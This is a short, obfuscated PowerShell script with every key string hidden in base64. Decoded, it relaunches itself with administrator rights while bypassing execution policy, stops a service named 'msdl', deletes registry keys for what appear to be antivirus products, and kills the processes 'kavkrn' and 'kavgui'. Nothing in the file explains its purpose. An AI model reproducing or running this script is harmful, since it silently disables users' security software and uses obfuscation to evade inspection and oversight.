 
If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgA='))))) {
    ${1} = New-Object System.Diagnostics.ProcessStartInfo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbAA=')));
    ${1}.Arguments = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIA'))) + $MyInvocation.MyCommand.Definition + "`"";
    ${1}.Verb = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgB1AG4AYQBzAA==')));
    [System.Diagnostics.Process]::Start(${1}) | Out-Null;
    exit;
}
spsv -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAbAA='))) -Force
rd -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVwBPAFcANgA0ADMAMgBOAG8AZABlAFwASwBWAFoASABvAG0AZQA='))) -Force -Recurse
rd -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAVwBPAFcANgA0ADMAMgBOAG8AZABlAFwASwBWAEgAbwBtAGUA'))) -Force -Recurse
kill -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBhAHYAawByAG4A'))) -Force
kill -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBhAHYAZwB1AGkA'))) -Force
exit
